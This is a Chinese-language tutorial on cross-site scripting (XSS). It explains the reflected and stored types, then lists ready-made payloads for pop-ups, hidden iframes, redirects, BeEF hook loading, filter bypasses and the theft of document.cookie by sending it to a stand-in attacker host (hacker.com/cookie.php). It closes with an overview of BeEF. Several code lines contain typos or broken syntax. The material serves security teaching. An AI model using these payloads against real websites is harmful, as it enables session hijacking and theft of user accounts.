跨站脚本攻击XSS：（Cross Site Scripting）

# 一、XSS简介
跨站脚本（cross site script）为了避免与css混淆，所以简称为XSS。

XSS是一种经常出现在web应用中的计算机安全漏洞，也是web中最主流的攻击方式。

XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。

## 1.1 XSS攻击的危害包括
 1. 盗取各类用户账号，如机器登录账号、用户网银账号、各类管理员账号。
 2. 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力。
 3. 盗窃企业重要的具有商业价值的材料。
 4. 非法转账。
 5. 强制发送电子邮件，
 6. 网站挂马。
 7. 控制受害者机器向其他网站发起攻击。

## 1.2 XSS原理解析
XSS主要原因：
过于信息客户端提交的数据！

### 1.2.1 XSS（反射型）
![](https://www.showdoc.cc/server/api/common/visitfile/sign/794b8ab40f61a12d9f0c08e2dca6ba66?showdoc=.jpg)

XSS主要分类：
反射型xss攻击（Reflected XSS）又称为非持久性跨站点脚本攻击，它是最常见的类型的XSS。漏洞产生原因是攻击者注入的数据反映在响应中。一个典型的非持久性XSS包含一个带XSS攻击向量的链接（即每次攻击需要用户的点击）。

### 1.2.2 XSS（存储型）
![](https://www.showdoc.cc/server/api/common/visitfile/sign/cfc877adedfc2f8726e8e6f8dcb471f9?showdoc=.jpg)

存储型XSS（Stored XSS）又称为持久型跨站点脚本，它一般发生在XSS攻击向量（一般指XSS攻击代码）存储在网站数据库，当一个页面被用户打开的时候执行。每当用户打开浏览器，脚本执行。持久的XSS相比非持久性XSS攻击危害性更大，因为每当用户打开页面，查看内容时脚本将自动执行。

存储型XSS（持久型XSS）即攻击者将带有XSS攻击的链接放在网页的某个页面，例如评论框等；用户访问此XSS链接并执行，由于存储型XSS能够攻击所有访问此页面的用户，所以危害非常大。

# 二、构造XSS脚本
## 2.1 常用HTML标签
```
<iframe>  iframe元素会创建包含另外一个文档的内联框架（即行内框架）。
<textarea>  <textarea>标签定义多行的文本输入控件。
<img>    img元素向网页中嵌入一幅图像。
<script>  <script>标签用于定义客户端脚本，比如JavaScript。script元素既可以包含脚本语句，也可以通过src属性指向外部脚本文件。必须的type属性规定脚本的MIME类型。JavaScript的常见应用时图像操作、表单验证以及动态内容更新。
```

## 2.2 常用JavaScript方法
```
alert   alert()方法用于显示带有一条指定消息和一个确认按钮的警告框。
window.location   window.location对象用于获得当前页面的地址（URL），并把浏览器重定向到新的页面。
Llcation.href   返回当前显示的文档的完整URL
lnload   一张页面或一幅图像完成加载。
lnsubmit   确认按钮被点击。
lnerror   在加载文档或图像时发生错误。
```

## 2.3 构造XSS脚本
### 2.3.1 弹窗警告
此脚本实现弹框提示，一般作为漏洞测试或者演示使用，类似SQL注入漏洞测试中的单引号’，一旦次脚本能执行，也就意味着后端服务器没有对特殊字符做过滤<>/’，这样就可以证明，这个页面位置存在了XSS漏洞。
```Javascript
<script>alert(‘xss’)</script>
<script>alert(document.cookie)</script>
```
### 2.3.2 页面嵌套
```html
<iframe src=http://www.baidu.com width=300 height=300></iframe>
<iframe src=http://www.baidu.com width=0 height=0 border=0></iframe>
```
### 2.3.3 页面重定向
```Javascript
<script>window.location=”http://www.baidu.com”</script>
<script>location.href=”http://www.baidu.com”</script>
```
### 2.3.4 弹框警告并重定向
```Javascript
<script>alert(“请进入新的网站”);location.href=”http://www.baidu.com”</script>
<script>alert(‘xss’);location.href=”http://10.1.1.2/mul/test.txt”</script>
// 通过网站内部私信的方式将其发给其他用户。如果其他用户点击并且相信了这个信息，则可能在另外的站点重新登录账户（克隆网站收集账户）。
```
### 2.3.4 访问恶意代码
```Javascript
<script src=”http://www.baidu.com/xss.js”></script>
<script src=”http://BeEF_IP:3000/hook.js”></script>
// 结合BeEF收集用户的cookie
```

### 2.3.5 巧用图片标签
```html
<img src=”#” onerror=alert(‘xss’)>
<img src=”javascript:alert(‘xss’);”>
<img src=”http://BeEF_IP:3000/hook.js”></img>
```
### 2.3.5 绕开过滤的脚本
```html
// 大小写<ScrIpt>alert(‘xss’)</SCRipt>
// 字符编码 采用URL、Base64等编码
<a href=”&#106,&#97;”>test</a>
```
### 2.3.6 收集用户cookie
```Javascript
// 打开新窗口并且采用本地cookie访问目标网页。
<script>window.open(“http://www.hacker.com/cookie.php?cookie=”+document.cookie)</script>
<script>document.location(“http://www.hacker.com/cookie.php?cookie=”+document.cookie)</script>
<script>new Image.src=”http://www.hacker.com/cookie.php?cookie=”+document.cookie;</script>
<img src=”http://www.hacker.com/cookie.php?cookie=’+document.cookie”></img>
<iframe src=”http://www.hacker.com/cookie.php?cookie=’+document.cookie”></iframe>
<script>new Image.src=”http://www.hacker.com/cookie.php?cookie=’+document.cookie”;img.width=0;img.height=0;</script>
```
# 三、自动化XSS
## 3.1 BeEF简介
Browser Exploitation Framework（BeEF）
BeEF是目前最强大的浏览器开源渗透测试框架，通过XSS漏洞配置JS脚本和Metasploit进行渗透；BeEF是基于Ruby语言编写的，支持图形化界面，操作简单。
官方网站：http://beefproject.com/

## 3.2 信息收集
 1. 网络发现
 2. 主机信息
 3. Cookie获取
 4. 会话劫持
 5. 键盘记录
 6. 插件信息

## 3.3 持久化控制
 1. 确认弹框
 2. 小窗口
 3. 中间人

## 3.4 社会工程
 1. 点击劫持
 2. 弹窗告警
 3. 虚假页面
 4. 钓鱼页面

## 3.5 渗透攻击
 1. 内网渗透
 2. Metasploit
 3. CSRF攻击
 4. DDOS攻击

## 3.6 BeEF基础
![](https://www.showdoc.cc/server/api/common/visitfile/sign/0d83a34978091793bc4484c046116801?showdoc=.jpg)

命令颜色(color)：
 - 绿色：对目标主机生效并且不可见（不会被发现）
 - 橙色：对目标主机生效但可能可见（可能被发现）
 - 灰色：对目标主机未必生效（可验证下）
 - 红色：对目标主机不生效

